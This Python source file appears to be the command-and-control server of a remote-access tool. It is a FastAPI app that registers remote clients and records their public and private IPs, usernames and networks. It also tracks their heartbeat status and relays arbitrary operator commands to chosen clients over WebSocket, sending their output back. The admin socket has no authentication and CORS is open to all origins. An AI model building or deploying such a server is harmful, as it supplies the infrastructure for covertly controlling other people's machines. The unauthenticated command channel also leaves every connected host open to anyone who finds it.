from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import time
import json
import os

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}          # client_id → WebSocket
last_seen = {}        # client_id → timestamp
client_infos = {}     # client_id → info dict
admin_ws = None

OFFLINE_THRESHOLD = 60
BACKLOG_THRESHOLD = 120

@app.get("/clients")
async def list_clients():
    now = time.time()
    online, offline, backlog = [], [], []
    for cid in list({**clients, **last_seen}.keys()):
        delta = now - last_seen.get(cid, 0)
        info = client_infos.get(cid, {})
        e = {
            "id": cid,
            "public_ip": info.get("public_ip",""),
            "private_ip": info.get("private_ip",""),
            "username": info.get("username",""),
            "network": info.get("network",""),
            "last_seen": last_seen.get(cid,0)
        }
        if delta >= BACKLOG_THRESHOLD:
            e["status"]="Backlog"; backlog.append(e)
        elif delta >= OFFLINE_THRESHOLD:
            e["status"]="Offline"; offline.append(e)
        else:
            e["status"]="Online"; online.append(e)
    return {"online":online,"offline":offline,"backlog":backlog}

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id]=websocket
    last_seen[client_id]=time.time()
    try:
        while True:
            data = await websocket.receive()
            last_seen[client_id]=time.time()
            if "text" in data:
                try:
                    msg=json.loads(data["text"])
                    if msg.get("type")=="client_info":
                        client_infos[client_id]=msg["data"]
                        continue
                except:
                    pass
                if admin_ws:
                    await admin_ws.send_text(f"[{client_id}] {data['text']}")
    except WebSocketDisconnect:
        clients.pop(client_id,None)
        last_seen.pop(client_id,None)
        client_infos.pop(client_id,None)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    global admin_ws
    await websocket.accept()
    admin_ws=websocket
    try:
        while True:
            msg=await websocket.receive_json()
            tgt=msg.get("target"); cmd=msg.get("cmd")
            if tgt in clients:
                await clients[tgt].send_text(cmd)
    except WebSocketDisconnect:
        admin_ws=None

@app.get("/")
async def serve_index():
    with open("static/index.html") as f:
        return HTMLResponse(f.read())

@app.get("/client/{client_id}")
async def serve_client_page(client_id: str):
    with open("static/client.html") as f:
        return HTMLResponse(f.read())

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__=="__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT",10000)))
